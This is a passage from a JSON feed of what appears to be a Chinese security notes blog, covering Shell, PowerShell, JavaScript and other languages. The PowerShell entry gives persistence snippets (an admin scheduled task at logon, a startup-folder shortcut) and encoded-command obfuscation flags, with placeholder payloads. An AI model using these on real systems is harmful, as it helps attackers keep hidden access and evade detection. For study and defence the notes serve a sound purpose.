data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvZG90bmV0L2NzaGFycC9wcm9ncmFtbWluZy1ndWlkZS9kZWxlZ2F0ZXMv\">Delegates</span> 机制的 D/Invoke，通过更隐蔽的方式来调用所需的 API。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"net\"><a class=\"anchor\" href=\"#net\">#</a> .Net</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvZG90bmV0L2Z1bmRhbWVudGFscy8=\">.NET documentation</span></li>\n</ul>\n<h2 id=\"利用技巧-2\"><a class=\"anchor\" href=\"#利用技巧-2\">#</a> 利用技巧</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGV3b3Zlci5naXRodWIuaW8vRHluYW1pYy1JbnZva2Uv\">Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks)</span></li>\n</ul>\n",
            "tags": [
                "CSharp"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/",
            "title": "Shell",
            "date_published": "2022-11-28T02:48:11.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>Shell 是一个特殊的程序，是用户使用 Linux 的桥梁。Shell 既是一种命令，又是一种程序设计语言。</p>\n<p>Linux 包含多种 Shell ，常见的有：</p>\n<ul>\n<li>Bourne Shell（ATT 的 Bourne 开发，名为 sh）</li>\n<li>Bourne Again Shell（/bin/bash）</li>\n<li>C Shell（Bill Joy 开发，名为 csh）</li>\n<li>K Shell（ATT 的 David G.koun 开发，名为 ksh）</li>\n<li>Z Shell（Paul Falstad 开发，名为 zsh）</li>\n</ul>\n<h1 id=\"元字符\"><a class=\"anchor\" href=\"#元字符\">#</a> 元字符</h1>\n<p>shell 一般会有一系列特殊字符，用来实现的一定的效果，这种字符被称为元字符（Meta），不同的 Shell 支持的元字符可能会不相同。</p>\n<p>常见的元字符如下：</p>\n<ul>\n<li><code>IFS</code>  由 &lt;space&gt; 或 &lt;tab&gt; 或 &lt;enter&gt; 三者之一组成</li>\n<li><code>CR</code>  由 &lt;enter&gt; 产生。</li>\n<li><code>=</code>  设定变量</li>\n<li><code>$</code>  作变量或运算替换</li>\n<li><code>&gt;</code>  重定向 stdout</li>\n<li><code>&gt;&gt;</code>  追加到文件</li>\n<li><code>&lt;</code>  重定向 stdin</li>\n<li><code>|</code>  命令管道</li>\n<li><code>&amp;</code>  后台执行命令</li>\n<li><code>;</code>  在前一个命令结束后，执行下一个命令</li>\n<li><code>&amp;&amp;</code>  在前一个命令未报错执行后，执行下一个命令</li>\n<li><code>||</code>  在前一个命令执行报错后，执行下一个命令</li>\n<li><code>'</code>  在单引号内的命令会保留原来的值</li>\n<li><code>&quot;</code>  在双引号内的命令会允许变量替换</li>\n<li><code>`</code>  在反引号内的内容会当成命令执行并替换</li>\n<li><code>()</code>  在子 Shell 中执行命令</li>\n<li><code>&#123;&#125;</code>  在当前 Shell 中执行命令</li>\n<li><code>~</code>  当前用户的主目录</li>\n<li><code>!number</code>  执行历史命令，如  <code>!1</code></li>\n</ul>\n<h1 id=\"通配符\"><a class=\"anchor\" href=\"#通配符\">#</a> 通配符</h1>\n<p>除元字符外，通配符（wildcard）也是 shell 中的一种特殊字符。当 shell 在参数中遇到了通配符时，shell 会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行替换，否则就将该通配符作为一个普通字符直接传递。</p>\n<p>常见的通配符如下：</p>\n<ul>\n<li><code>*</code>  匹配 0 或多个字符</li>\n<li><code>?</code>  匹配任意一个字符</li>\n<li><code>[list]</code>  匹配 list 中的任意一个字符</li>\n<li><code>[!list]</code>  匹配除 list 外的任意一个字符</li>\n<li><code>[a-c]</code>  匹配 a-c 中的任意一个字符</li>\n<li><code>&#123;string1,string2,...&#125;</code>  分别匹配其中字符串</li>\n</ul>\n",
            "tags": [
                "Linux",
                "Shell"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PowerShell/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PowerShell/",
            "title": "PowerShell",
            "date_published": "2022-11-28T02:40:11.000Z",
            "content_html": "<h1 id=\"执行策略\"><a class=\"anchor\" href=\"#执行策略\">#</a> 执行策略</h1>\n<p>PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略。</p>\n<p>Restricted 策略可以执行单个的命令，但是不能执行脚本，Windows 8、 Windows Server 2012 中默认使用该策略。</p>\n<p>AllSigned 策略允许执行所有具有数字签名的脚本。</p>\n<p>RemoteSigned 当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</p>\n<p>Unrestricted 这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。</p>\n<p>BypassBypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。</p>\n<p>UndefinedUndefined 表示没有设置脚本策略，会继承或使用默认的脚本策略。</p>\n<h1 id=\"混淆\"><a class=\"anchor\" href=\"#混淆\">#</a> 混淆</h1>\n<ul>\n<li><code>-EC</code></li>\n<li><code>-EncodedCommand</code></li>\n<li><code>-EncodedComman</code></li>\n<li><code>-EncodedComma</code></li>\n<li><code>-EncodedComm</code></li>\n</ul>\n<h1 id=\"常见功能\"><a class=\"anchor\" href=\"#常见功能\">#</a> 常见功能</h1>\n<h2 id=\"计划任务\"><a class=\"anchor\" href=\"#计划任务\">#</a> 计划任务</h2>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$Action</span> = <span class=\"token function\">New-ScheduledTaskAction</span> <span class=\"token operator\">-</span>Execute <span class=\"token string\">\"calc.exe\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$Trigger</span> = <span class=\"token function\">New-ScheduledTaskTrigger</span> <span class=\"token operator\">-</span>AtLogon</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$User</span> = <span class=\"token function\">New-ScheduledTaskPrincipal</span> <span class=\"token operator\">-</span>GroupId <span class=\"token string\">\"BUILTIN\\Administrators\"</span> <span class=\"token operator\">-</span>RunLevel Highest</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$Set</span> = <span class=\"token function\">New-ScheduledTaskSettingsSet</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$object</span> = <span class=\"token function\">New-ScheduledTask</span> <span class=\"token operator\">-</span>Action <span class=\"token variable\">$Action</span> <span class=\"token operator\">-</span>Principal <span class=\"token variable\">$User</span> <span class=\"token operator\">-</span>Trigger <span class=\"token variable\">$Trigger</span> <span class=\"token operator\">-</span>Settings <span class=\"token variable\">$Set</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">Register-ScheduledTask</span> AtomicTask <span class=\"token operator\">-</span>InputObject <span class=\"token variable\">$object</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">Unregister-ScheduledTask</span> <span class=\"token operator\">-</span>TaskName <span class=\"token string\">\"AtomicTask\"</span> <span class=\"token operator\">-</span>confirm:<span class=\"token boolean\">$false</span></pre></td></tr></table></figure><h2 id=\"创建链接\"><a class=\"anchor\" href=\"#创建链接\">#</a> 创建链接</h2>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$Shell</span> = <span class=\"token function\">New-Object</span> <span class=\"token operator\">-</span>ComObject <span class=\"token punctuation\">(</span><span class=\"token string\">\"WScript.Shell\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$ShortCut</span> = <span class=\"token variable\">$Shell</span><span class=\"token punctuation\">.</span>CreateShortcut<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token variable\">$env</span>:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.lnk\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$ShortCut</span><span class=\"token punctuation\">.</span>TargetPath=<span class=\"token string\">\"cmd.exe\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$ShortCut</span><span class=\"token punctuation\">.</span>WorkingDirectory = <span class=\"token string\">\"C:\\Windows\\System32\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$ShortCut</span><span class=\"token punctuation\">.</span>WindowStyle = 1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$ShortCut</span><span class=\"token punctuation\">.</span>Description = <span class=\"token string\">\"test.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$ShortCut</span><span class=\"token punctuation\">.</span>Save<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"编码\"><a class=\"anchor\" href=\"#编码\">#</a> 编码</h2>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$OriginalCommand</span> = <span class=\"token string\">'#&#123;powershell_command&#125;'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$Bytes</span> = <span class=\"token namespace\">[System.Text.Encoding]</span>::Unicode<span class=\"token punctuation\">.</span>GetBytes<span class=\"token punctuation\">(</span><span class=\"token variable\">$OriginalCommand</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$EncodedCommand</span> =<span class=\"token namespace\">[Convert]</span>::ToBase64String<span class=\"token punctuation\">(</span><span class=\"token variable\">$Bytes</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h2>\n<ul>\n<li>\n<p>别名</p>\n<ul>\n<li><code>alias</code></li>\n</ul>\n</li>\n<li>\n<p>下载文件</p>\n<ul>\n<li><code>Invoke-WebRequest &quot;https://example.com/test.zip&quot; -OutFile &quot;$env:TEMP\\test.zip&quot;</code></li>\n</ul>\n</li>\n<li>\n<p>解压缩</p>\n<ul>\n<li><code>Expand-Archive $env:TEMP\\test.zip $env:TEMP\\test -Force</code></li>\n</ul>\n</li>\n<li>\n<p>进程</p>\n<ul>\n<li>启动进程  <code>Start-Process calc</code></li>\n<li>停止进程  <code>Stop-Process -ID $pid</code></li>\n</ul>\n</li>\n<li>\n<p>文件</p>\n<ul>\n<li>新建文件  <code>New-Item #&#123;file_path&#125; -Force | Out-Null</code></li>\n<li>设置文件内容  <code>Set-Content -Path #&#123;file_path&#125; -Value &quot;#&#123;Content&#125;&quot;</code></li>\n<li>追加文件内容  <code>Add-Content -Path #&#123;file_path&#125; -Value &quot;#&#123;Content&#125;&quot;</code></li>\n<li>复制文件  <code>Copy-Item src dst</code></li>\n<li>删除文件  <code>Remove-Item #&#123;outputfile&#125; -Force -ErrorAction Ignore</code></li>\n<li>子目录  <code>Get-ChildItem #&#123;file_path&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>服务</p>\n<ul>\n<li>获取服务  <code>Get-Service -Name &quot;#&#123;service_name&#125;&quot;</code></li>\n<li>启动服务  <code>Start-Service -Name &quot;#&#123;service_name&#125;&quot;</code></li>\n<li>停止服务  <code>Stop-Service -Name &quot;#&#123;service_name&#125;&quot;</code></li>\n<li>删除服务  <code>Remove-Service -Name &quot;#&#123;service_name&#125;&quot;</code></li>\n</ul>\n</li>\n<li>\n<p>获取 WMI 支持  <code>Get-WmiObject -list</code></p>\n</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vcG93ZXJzaGVsbC8=\">PowerShell 官方文档</span></li>\n</ul>\n",
            "tags": [
                "PowerShell"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/ASP/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/ASP/",
            "title": "ASP",
            "date_published": "2022-11-28T02:36:11.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>ASP 是动态服务器页面 (Active Server Page)，是微软开发的类似 CGI 脚本程序的一种应用，其网页文件的格式是  <code>.asp</code>  。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTGl0dGxlSGFubi9wLzUwMTY5OTkuaHRtbA==\">Deformity ASP/ASPX Webshell、Webshell Hidden Learning</span></li>\n</ul>\n",
            "tags": [
                "ASP"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Ruby/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Ruby/",
            "title": "Ruby",
            "date_published": "2022-11-28T02:36:11.000Z",
            "content_html": "<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZWx0dGFtLmNvbS5hdS9ibG9nL3J1YnktZGVzZXJpYWxpemF0aW9uLw==\">ruby deserialization</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRUNMd01iYnJmOWxXWGtoYlVlcmdYZw==\">Ruby 安全漫谈</span></li>\n</ul>\n",
            "tags": [
                "Ruby"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Golang/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Golang/",
            "title": "Golang",
            "date_published": "2022-11-28T02:34:11.000Z",
            "content_html": "<h1 id=\"golang-runtime\"><a class=\"anchor\" href=\"#golang-runtime\">#</a> Golang Runtime</h1>\n<p>Go 中的线程被称为 Goroutine 或 G，内核线程被称为 M。这些 G 被调度到 M 上，即所谓的 G：M 线程模型，或更常用的 M：N 线程模型，用户空间线程或 green 线程模型。</p>\n<h1 id=\"字符串处理\"><a class=\"anchor\" href=\"#字符串处理\">#</a> 字符串处理</h1>\n<ul>\n<li>Go 源代码始终为 UTF-8</li>\n<li>代表 Unicode 码点的字节序列称为  <code>rune</code></li>\n<li>Go 不保证字符串中的字符被规范化</li>\n<li>字符串可以包含任意字节</li>\n<li>字符串中不包含字节级转义符时，字符串始终包含有效的 UTF-8 序列</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmdvbGFuZy5vcmcvc3RyaW5ncw==\">Strings, bytes, runes and characters in Go</span></li>\n</ul>\n",
            "tags": [
                "Golang"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/",
            "title": "JavaScript",
            "date_published": "2022-11-28T01:50:11.000Z",
            "content_html": "<h1 id=\"ecmascript\"><a class=\"anchor\" href=\"#ecmascript\">#</a> ECMAScript</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>ECMAScript 是一种由 ECMA 国际通过 ECMA-262 标准化的脚本程序设计语言，它往往被称为 JavaScript 或 JScript。简单的，可以认为 ECMAScript 是 JavaScript 的一个标准，但实际上后两者是 ECMA-262 标准的实现和扩展。</p>\n<h2 id=\"版本\"><a class=\"anchor\" href=\"#版本\">#</a> 版本</h2>\n<p>1997 年 6 月，首版发布。1998 年 6 月，进行了格式修正，以使得其形式与 ISO/IEC16262 国际标准一致。1999 年 12 月，引入强大的正则表达式，更好的词法作用域链处理，新的控制指令，异常处理，错误定义更加明确，数据输出的格式化及其它改变。而后由于关于语言的复杂性出现分歧，第 4 版本被放弃，其中的部分成为了第 5 版本及 Harmony 的基础。</p>\n<p>2009 年 12 月，第五版发布，新增 “严格模式（strict mode）”，澄清了许多第 3 版本的模糊规范，并适应了与规范不一致的真实世界实现的行为。增加了部分新功能，如 getters 及 setters，支持 JSON 以及在对象属性上更完整的反射。</p>\n<p>2015 年 6 月，第 6 版发布，最早被称作是 ECMAScript 6（ES6），添加了类和模块的语法，迭代器，Python 风格的生成器和生成器表达式，箭头函数，二进制数据，静态类型数组，集合（maps，sets 和 weak maps），promise，reflection 和 proxies。</p>\n<p>2016 年 6 月，ECMAScript 2016（ES2016）发布，引入  <code>Array.prototype.includes</code>  、指数运算符、SIMD 等新特性。</p>\n<p>2017 年 6 月，ECMAScript 2017（ES2017）发布，多个新的概念和语言特性。</p>\n<p>2018 年 6 月，ECMAScript 2018 （ES2018）发布包含了异步循环，生成器，新的正则表达式特性和 rest/spread 语法。</p>\n<h2 id=\"es6-特性\"><a class=\"anchor\" href=\"#es6-特性\">#</a> ES6 特性</h2>\n<ul>\n<li><code>const</code>  /  <code>let</code></li>\n<li>模板字面量</li>\n<li>解构\n<ul>\n<li><code>[a, b] = [10, 20]</code></li>\n</ul>\n</li>\n<li>对象字面量简写法</li>\n<li><code>for...of</code>  循环</li>\n<li><code>...xxx</code>  展开运算符</li>\n<li>可变参数</li>\n<li>箭头函数</li>\n<li>默认参数函数</li>\n<li>默认值与解构</li>\n<li>类</li>\n</ul>\n<h1 id=\"引擎\"><a class=\"anchor\" href=\"#引擎\">#</a> 引擎</h1>\n<h2 id=\"v8\"><a class=\"anchor\" href=\"#v8\">#</a> V8</h2>\n<p>V8 是 Chrome 的 JavaScript 语言处理程序（VM）。其引擎由 TurboFan、Ignition 和 Liftoff 组成。其中 Turbofan 是其优化编译器，Ignition 则是其解释器，Liftoff 是 WebAssembly 的代码生成器。</p>\n<h2 id=\"spidermonkey\"><a class=\"anchor\" href=\"#spidermonkey\">#</a> SpiderMonkey</h2>\n<p>SpiderMonkey 是 Mozilla 项目的一部分，是一个用 C/C++ 实现的 JavaScript 脚本引擎。</p>\n<h2 id=\"javascriptcore\"><a class=\"anchor\" href=\"#javascriptcore\">#</a> JavaScriptCore</h2>\n<p>JavaScriptCore 的优化执行分为四个部分，LLInt、Baseline、DFG、FTL。LLInt 是最开始的解释执行部分，Baseline 是暂时的 JIT，DFG 阶段开始做一定的优化，FTL 阶段做了充分的优化。</p>\n<h2 id=\"chakracore\"><a class=\"anchor\" href=\"#chakracore\">#</a> ChakraCore</h2>\n<p>ChakraCore 是一个完整的 JavaScript 虚拟机，由微软实现，用于 Edge 浏览器以及 IE 的后期版本中。</p>\n<h2 id=\"jscript\"><a class=\"anchor\" href=\"#jscript\">#</a> JScript</h2>\n<p>JScript 是由微软开发的脚本语言，是微软对 ECMAScript 规范的实现，用于 IE 的早期版本中。</p>\n<h2 id=\"jerryscript\"><a class=\"anchor\" href=\"#jerryscript\">#</a> JerryScript</h2>\n<p>JerryScript 是一个适用于嵌入式设备的小型 JavaScript 引擎，由三星开发并维护。</p>\n<h1 id=\"webassembly\"><a class=\"anchor\" href=\"#webassembly\">#</a> WebAssembly</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>简而言之，WASM 是一种分发要在浏览器中执行的代码的新方法。它是一种二进制语言，但是无法直接在处理器上运行。在运行时，代码被编译为中间字节代码，可以在浏览器内快速转换为机器代码，然后比传统 JavaScript 更有效地执行。</p>\n<h2 id=\"执行\"><a class=\"anchor\" href=\"#执行\">#</a> 执行</h2>\n<p>虽然浏览器可能以不同的方式来实现 Wasm 支持，但是使用的沙盒环境通常是 JavaScript 沙箱。</p>\n<p>在浏览器中运行时，Wasm 应用程序需要将其代码定义为单独的文件或 JavaScript 块内的字节数组。 然后使用 JavaScript 实例化文件或代码块，目前不能在没有 JavaScript 包装器的情况下直接在页面中调用 Wasm。</p>\n<p>虽然 Wasm 可以用 C / C++ 等语言编写，但它本身不能与沙箱之外的环境进行交互。这意味着当 Wasm 应用程序想要进行输出文本等操作时，它需要调用浏览器提供的功能，然后使用浏览器在某处输出文本。</p>\n<p>Wasm 中的内存是线性的，它在 Wasm 应用程序和 JavaScript 之间共享。 当 Wasm 函数将字符串返回给 JavaScript 时，它实际上返回一个指向 Wasm 应用程序内存空间内位置的指针。 Wasm 应用程序本身只能访问分配给它的 JavaScript 内存部分，而不是整个内存空间。</p>\n<h2 id=\"安全\"><a class=\"anchor\" href=\"#安全\">#</a> 安全</h2>\n<p>Wasm 的设计从如下几个方面考虑来保证 Wasm 的安全性</p>\n<ul>\n<li>保护用户免受由于无意的错误而导致漏洞的应用程序的侵害</li>\n<li>保护用户免受故意编写为恶意的应用程序的侵害</li>\n<li>为开发人员提供良好的缓解措施</li>\n</ul>\n<p>具体的安全措施有</p>\n<ul>\n<li>Wasm 应用程序在沙箱内运行</li>\n<li>Wasm 无法对任意地址进行函数调用。Wasm 采用对函数进行编号的方式，编号存储在函数表中</li>\n<li>间接函数调用受类型签名检查的约束</li>\n<li>调用堆栈受到保护，这意味着无法覆盖返回指针</li>\n<li>实现了控制流完整性，这意味着调用意外的函数将失败</li>\n</ul>\n<h1 id=\"作用域与闭包\"><a class=\"anchor\" href=\"#作用域与闭包\">#</a> 作用域与闭包</h1>\n<h2 id=\"作用域与作用域链\"><a class=\"anchor\" href=\"#作用域与作用域链\">#</a> 作用域与作用域链</h2>\n<h3 id=\"作用域\"><a class=\"anchor\" href=\"#作用域\">#</a> 作用域</h3>\n<p>简单来说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期。JavaScript 的作用域是靠函数来形成的，也就是说一个函数的变量在函数外不可以访问。</p>\n<p>作用域可以分为全局作用域、局部作用域和块级作用域，其中全局作用域主要有以下三种情况：</p>\n<ul>\n<li>函数外面定义的变量拥有全局作用域</li>\n<li>未定义直接赋值的变量自动声明为拥有全局作用域</li>\n<li>window 对象的属性拥有全局作用</li>\n</ul>\n<p>局部作用域一般只在固定的代码片段内可访问到，最常见的例如函数内部，所以也会把这种作用域称为函数作用域。</p>\n<h3 id=\"作用域泄漏\"><a class=\"anchor\" href=\"#作用域泄漏\">#</a> 作用域泄漏</h3>\n<p>在 ES5 标准时，只有全局作用域和局部作用域，没有块级作用域，这样可能会造成变量泄漏的问题。例如：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// undefined</span></pre></td></tr></table></figure><h3 id=\"作用域提升var-hoisting\"><a class=\"anchor\" href=\"#作用域提升var-hoisting\">#</a> 作用域提升（var Hoisting）</h3>\n<p>在 JavaScript 中，使用 var 在函数或全局内任何地方声明变量相当于在其内部最顶上声明它，这种行为称为 Hoisting。例如下面这段代码等效于第二段代码</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => undefined</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">var</span> x <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => 1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">var</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => undefined</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    x <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => 1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"作用域链\"><a class=\"anchor\" href=\"#作用域链\">#</a> 作用域链</h3>\n<p>当函数被执行时，总是先从函数内部找寻局部变量，如果找不到相应的变量，则会向创建函数的上级作用域寻找，直到找到全局作用域为止，这个过程被称为作用域链。</p>\n<h2 id=\"闭包\"><a class=\"anchor\" href=\"#闭包\">#</a> 闭包</h2>\n<p>函数与对其状态即词法环境（lexical environment）的引用共同构成闭包（closure）。也就是说，闭包可以让你从内部函数访问外部函数作用域。在 JavaScript，函数在每次创建时生成闭包。</p>\n<p>在 JavaScript 中，并没有原生的对 private 方法的支持，即一个元素 / 方法只能被同一个类中的其它方法所调用。而闭包则是一种可以被用于模拟私有方法的方案。另外闭包也提供了管理全局命名空间的能力，避免非核心的方法或属性污染了代码的公共接口部分。下面是一个简单的例子：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> Counter <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">var</span> privateCounter <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function\">changeBy</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    privateCounter <span class=\"token operator\">+=</span> val<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td 